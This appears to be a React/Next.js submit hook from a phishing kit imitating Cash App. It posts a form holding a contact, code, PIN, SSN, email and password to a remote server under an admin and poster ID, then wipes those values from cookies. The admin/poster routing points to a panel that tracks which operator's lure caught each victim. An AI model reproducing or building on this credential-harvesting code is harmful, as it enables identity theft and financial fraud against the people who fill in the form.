import { useRouter } from "next/router";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config";

function useMockSubmit() {
  const {
    query: { adminId, posterId },
  } = useRouter();

  const submit = async (values, formik) => {
    // console.log(values);
    // Cookies.remove("contact");
    // Cookies.remove("code");
    // Cookies.remove("pin");
    // Cookies.remove("ssn");
    // Cookies.remove("email");
    // Cookies.remove("password");
    // formik.resetForm();
    // return;

    const url = `${API_URL}/cashapp/add/${adminId}/${posterId}`;

    console.log(url);

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      Cookies.remove("contact");
      Cookies.remove("code");
      Cookies.remove("pin");
      Cookies.remove("ssn");
      Cookies.remove("email");
      Cookies.remove("password");
      toast.success("Submitted Successfully");
      formik.resetForm();
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { submit };
}

export default useMockSubmit;
